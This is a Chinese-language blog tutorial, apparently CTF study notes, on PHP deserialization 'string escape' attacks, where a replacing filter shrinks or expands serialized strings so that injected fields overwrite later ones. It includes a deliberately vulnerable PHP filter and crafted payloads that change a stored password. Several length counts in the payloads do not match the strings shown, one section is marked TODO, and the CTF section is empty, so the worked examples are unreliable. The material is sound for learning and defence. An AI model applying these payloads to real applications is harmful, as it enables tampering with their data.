---
title: "PHP反序列化——字符串逃逸"
description: "PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾(字符串除外)，并且根据长度判断内容"
publishDate: "2025-09-22T00:00:00+08:00"
ogImage: "https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/0df31c475c0bdfdc371dbfa6f0fbe139.jpeg"
categories: ["PHP Security"]
tags: ["php", "反序列化", "字符串逃逸"]
---
PHP 在反序列化时，底层代码是以 **`;`** 作为字段的分隔，以 **`}`** 作为结尾(字符串除外)，并且根据长度判断内容



```php
流内容:  s:N:"[这里是 N 个字节]" ;  s:4:"next" ; ...
指针:    ^^^  ^^^^^^^^^^^^^^^^^  ^^  ^^^^^^^^^^^
阶段:    读头  精读 N 字节内容     校验"; 继续解析后续令牌
```

一旦 filter 改变了这 N 个字节“在流中的位置/长度”，就会出现两类错位：

* 过滤后字符变少（shrink）：实际内容更短 → 为凑满 N，指针会“吞到”后续结构的字节里。

* 过滤后字符变多（expand）：实际内容更长 → 读满 N 后，理论上的 "; 还没到 → 需要我们在 payload 中预埋一处 ";，恰好落在“读满 N”后的两字节，否则报错。这样可“提前闭合”，把我们想让解析器看到的新键值对暴露在外。

## 过滤后字符“变少”（shrink）——吞并后续字段

* 典型过滤：str\_replace('php','') 或移除 'flag' 等。

* 结果：某字段 s:N:"..."; 的真实字节数减少 Δ（Δ>0），解析器仍要读满 N，于是会吞进后续的 ";s:... 等结构字节来补齐。

```json
  原: s:19:"AAAphpBBBflagCCC";";s:4:"sign";s:6:"secret";}
             ^^^   ^^^^   (被删 3 + 4 = 7)
  过滤后: s:19:"AAABBBCCC";";s:4:"sign";s:6:"secret";}
                  ^ 指针还需补 7 字节 → 吞进后面的 `";s:4:"sign"...`
```



```php
<?php
function filter($str){
  return str_replace('xx','y',$str);
}

$username = "mikasa";
$password = "biubiu";
$user = array($username,$password);

$str1 = filter(serialize($user));
//$str2 = filter($_GET['user']);

var_dump(unserialize($str1));
//var_dump(unserialize($str2));
?>;
```

正常序列化输出

```php
a:2:{i:0;s:6:"mikasa";i:1;s:6:"biubiu";}
```

如果username字段为`mikasaxxxx`经过过滤输出

```php
a:2:{i:0;s:10:"mikasayy";i:1;s:6:"biubiu";}
```

比如，我们现在想让password变为123456，其序列化结果期望如下：

`a:2:{i:0;s:6:"mikasa";i:1;s:6:"123456";}`

对比一下现有子串和目标子串

```php
";i:1;s:6:"biubiu";}
";i:1;s:6:"123456";}
//一共20个字符
```

两个“X”字符替换成一个“Y”字符，这里吞掉了一个字符

构造20个XX

```php
a:2:{i:0;s:46:"mikasaxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";i:1;s:6:"biubiu";}


after filter


a:2:{i:0;s:46:"mikasayyyyyyyyyyyyyyyyyyyy";i:1;s:6:"biubiu";}
```

So,最终的构造的绕过序列化语句为

```php
a:2:{i:0;s:46:"mikasaxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";i:1;s:6:"biubiu";}";i:1;s:6:"123456";}



a:2:{i:0;s:46:"mikasayyyyyyyyyyyyyyyyyyyy";i:1;s:6:"biubiu";}";i:1;s:6:"123456";}
```



## 过滤后字符“变多”（expand）——提前闭合并溢出注入

```php
<?php
function filter($str){
  return str_replace('x','yy',$str);
}

$username = "mikasa";
$password = "biubiu";
$user = array($username,$password);

$str1 = filter(serialize($user));
//$str2 = filter($_GET['user']);

var_dump(unserialize($str1));
//var_dump(unserialize($str2));
?>;
```

正常序列化输出

```php
a:2:{i:0;s:6:"mikasa";i:1;s:6:"biubiu";}
```

如果username字段为`mikasaxxx`经过过滤输出

```php
a:2:{i:0;s:9:"mikasayyyyyy";i:1;s:6:"biubiu";}
```

反序列化报错，但是这种报错机制又能带来漏洞利用点，可以进行字符拼接，改变属性值。

比如，我们现在想让password变为123456，其序列化结果期望如下：

`a:2:{i:0;s:6:"mikasa";i:1;s:6:"123456";}`

我们拼接了“`";i:1;s:6:"123456";}`”共20个字符

所以这里可以构造为

```php
TODO  ->  a:2:{i:0;s:6:"mikasa";i:1;s:6:"123456";}
      ->  a:2:{i:0;s:46:"mikasaxxxxxxxxxxxxxxxxxxxx";i:1;s:6:"123456";}";i:1;s:6:"biubiu";}
Filter->  a:2:{i:0;s:46:"mikasayyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy";i:1;s:6:"123456";}";i:1;s:6:"biubiu";}
```

### BUUCTF \[0CTF 2016] piapiapia











## Reference：


